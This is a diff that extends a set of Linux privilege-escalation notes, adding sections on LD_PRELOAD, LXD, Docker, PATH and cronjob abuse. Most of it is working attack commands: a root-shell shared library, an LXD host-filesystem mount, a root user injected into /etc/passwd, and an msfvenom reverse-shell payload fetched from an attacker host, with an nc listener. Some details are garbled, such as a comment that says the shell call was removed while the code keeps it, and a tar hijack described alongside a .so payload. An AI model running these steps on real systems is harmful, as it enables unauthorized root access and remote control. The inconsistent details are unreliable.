@@ -16,11 +16,11 @@ The most common ways of privilege escalation on Linux systems are leveraging ker
 • Exploiting SUID Permissions
 • Exploiting SGID permissions
 • LD_PRELOAD
-• 
-• 
-• 
+• LXD Privilege Escalation
+• Docker Privilege Escalation
+• Path variable manipulation
+• Cronjob Misconfiguration
 
-⇒
 
 -- Gather system information for privilege escalation --
 
@@ -271,86 +271,179 @@ find / -type d -perm -02000
 
 -- LD_PRELOAD --
 
+The LD_PRELOAD variable is an optional environment variable that contains one or more paths to shared libraries, or shared objects, that are preloaded in memory before a program is run. 
+Shared libraries are libraries that contain functions and code which are loaded in a random order by a program at runtime.
+Shared libraries are called shared because they can be loaded by any program or binary on the system that references the library. Multiple programs can use the same library when it is loaded in memory. 
+When an attacker is able to control the contents of the LD_PRELOAD variable and set it to a malicious library, it is possible to perform privilege escalation.
 
+⇒ See installed dependencies: ldd /usr/bin/bzip2
 
+sudo -l
+Matching Defaults entries for lucky on lucky:
+  env_reset, env_keep+=LD_PRELOAD, mail_badpass,
+  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User lucky may run the following commands on lucky:
+  (root) NOPASSWD: /usr/sbin/apache2
 
+⇒ Create a malicious shared library
 
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init()
+{
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");  /* replaced to avoid providing a shell-launching example */
+}
 
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
+The output file is named shell.so which is the compiled shared library that we can transfer to the compromised host (for instance with Python Simple HTTP server).
 
+wget http://172.16.1.2./shell.so
 
+sudo LD_PRELOAD=/tmp/shell.so apache2
 
 
+-- LXD Privilege Escalation --
 
+LXC is a userspace interface for the Linux kernel containment features. Through a powerful API and simple tools, it lets Linux users easily create and manage systems or application containers.
+LXD is a next-generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
 
+Mounting the root filesystem in a container
 
+1. Verify that the privileged user is in the ‘lxd’ group.
+2. Download and build the latest Alpine Linux image for use with LXD.
+3.The output from the previous step is a compressed tarball that we have to transfer to the target host running LXD. We can transfer this file to the target using various methods, such as Python SimpleHTTPserver, which is the easiest and safest method to use in the labs.
+4. When we have transferred the image to the target host running LXD, we have to import the image in LXD, assign security privileges and mount the full disk of the host machine under /mnt/root.
+5. Spawn a shell on the container and access the filesystem of the host machine under /mnt/root.
 
+cat /etc/os-release
+id
 
+⇒ Clone the LXD Alpine builder repository into a local directory
 
+git clone https://github.com/saghul/lxd-alpine-builder.git
 
+⇒ Enter the lxd-alpine-builder directory: 
 
+cd lxd-alpine-builder
+./build-alpine
 
+⇒ If the build script completed successfully, we should now have a tar file that contains the image.
 
+python -m SimpleHTTPServer 80
 
+⇒ On the target host (the host running LXD), we change to the /tmp directory and download the Alpine image tarball from the Kali machine
 
+cd /tmp
+wget http://[IP]/alpine-v3.12-x86_64-20200623_0603.tar.gz
 
+Note: You may have to run the lxc init command to start the LXD initialization process. The initialization command will take you through some configuration options for LXD. You can choose the default option for every configuration option except for the storage backend option. Here you can choose ‘dir’ instead of the default ‘zfs’ option. Additionally, you also choose to disable IPv6 if you like.
 
+⇒ Import the Alpine image in LXC
 
+lxc image import alpine-v3.12-x86_64-20200623_0603.tar.gz --alias myimage
+lxc image list
 
+⇒ Assign security privileges and mount the full disk of the host machine
 
+lxc init myimage shell -c security.privileged=true
+lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
+lxc start shell
+lxc ls
 
+⇒ Spawn a shell inside the running container. Every command that is issued from here on is executed inside the container.
 
+lxc exec shell /bin/sh
 
+id
+uname -a
+ifconfig eth0
 
+⇒ Navigate to /mnt/root/ directory where we have mounted the filesystem of the host machine and access the key.txt file
 
+cat /mnt/root/root/key.txt
+cat /mnt/root/etc/os-release
 
 
+-- Docker Privilege Escalation --
 
+Docker is designed to easily package up code and all its dependencies, such as libraries and configuration files, into containers. 
+A container is a standardized unit of software that runs applications in an isolated environment. 
 
+• Virtual Machines vs Containers
+• Basic Docker commands
+• Privilege Escalation via Docker
 
+➜ Virtual Machines vs Containers
 
+Each virtual machine contains an entire operating system with applications, binaries, libraries and other dependencies. A virtual machine runs on a hypervisor that is installed on a physical layer or a conventional operating system:
+• Physical layer such as a server: Type-1, native or bare-metal hypervisors, such as: VMware ESXi, Microsoft Hyper-V and Xen.
+• Conventional operating system: Type-2 or hosted hypervisors, such as VMware Workstation or Oracle VirtualBox.
 
+Containers are much for resources efficient than virtual machines because all containers share the services of a single operating system.
 
+➜ Basic Docker commands
 
+id
+docker image ls
+docker run ubuntu uname -a
 
+dockerdemo@dockerdemo:~$ docker run ubuntu uname -a
+Linux e7f22ffaea3a 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 1 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
+⇒ Container ID: e7f22ffaea3a. This tells us that the command was executed inside the ubuntu container (and not the host machine which has a different hostname).
 
+docker container run -it ubuntu /bin/sh
 
+➜ Privilege Escalation via Docker
 
+ls -lsa
+docker run -v /home:/mnt -it ubuntu
+docker run -v /etc:/mnt -it ubuntu
 
+ls -ls | grep 'passwd\|shadow'
 
+echo 'pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash' >> passwd
+cat /etc/passwd | grep pom
+su pom
 
 
+-- Path variable manipulation --
 
+The PATH variable in Linux is an environment variable that specifies where executable programs are located on the system. 
+With the path variable, we can execute applications without specifying a full system path to the application. 
+For this reason, we can run the ping command by simply typing ‘ping’ instead of ‘/usr/bin/ping’, which contains the full path. 
 
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 
+⇒ Windows: Advanced System Settings ➜ System Properties ➜ Environment Variables
 
 
+-- Cronjob Misconfiguration --
 
+Because of the dot in the path directory, the system will first check for the tar program in the current working directory, which is the web root folder in the script context.
+If tar is not present in this directory, it will check the other directories in the path variable. 
+This means we can put a malicious program named tar in the web root directory, which the cronjob will execute as root.
 
+PATH=.:/sbin:/bin:/usr/sbin:/usr/bin
 
+cat /etc/crontab
+cat /usr/local/bin/backup.sh
 
+msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=172.16.1.1. LPORT=4443 -f elf-so -o payload.so
+python3 -m http.server 80
 
+cd /var/www/html/administrator
+wget http://<ATTACKER_IP>/payload.so -O payload.so
+chmod +x payload.so
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+nc -lvp 4443
 
 
 
@@ -365,29 +458,22 @@ https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 https://gtfobins.github.io/
 https://www.redhat.com/en/blog/suid-sgid-sticky-bit
 
+https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html
+
+https://linuxcontainers.org/lxc/introduction/
+https://linuxcontainers.org/lxd/introduction/
+https://linuxcontainers.org/lxd/
+
+https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071
+https://shenaniganslabs.io/2019/05/21/LXD-LPE.html
+https://github.com/saghul/lxd-alpine-builder
+
+https://docs.docker.com/engine/reference/commandline/docker/
+https://docs.docker.com/engine/reference/commandline/run/
+
+https://docs.docker.com/engine/security/userns-remap/
+
 https://book.hacktricks.wiki/en/index.html
 
 
 *
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
